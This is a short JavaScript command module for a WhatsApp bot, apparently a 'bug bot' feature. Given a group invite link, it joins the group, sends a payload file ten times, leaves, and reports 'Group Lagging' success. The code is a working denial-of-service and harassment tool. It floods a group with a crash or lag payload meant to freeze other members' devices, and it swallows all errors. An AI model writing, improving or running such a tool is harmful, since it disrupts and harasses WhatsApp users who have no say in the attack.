const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "gsl",
    execute: async (conn, msg, args, { from, isOwner }) => {
        if (!isOwner) return;
        try {
            const payload = fs.readFileSync('./lib/payloads/slugs.txt', 'utf-8');
            const code = args[0].split('https://chat.whatsapp.com/')[1];
            const jid = await conn.groupAcceptInvite(code);

            for (let i = 0; i < 10; i++) {
                await conn.sendMessage(jid, { text: "\u200B" + payload });
            }
            await conn.groupLeave(jid);
            await conn.sendMessage(conn.user.id, { text: "🥀 Mission Success: GSL Group Lagging." });
        } catch (e) {}
    }
};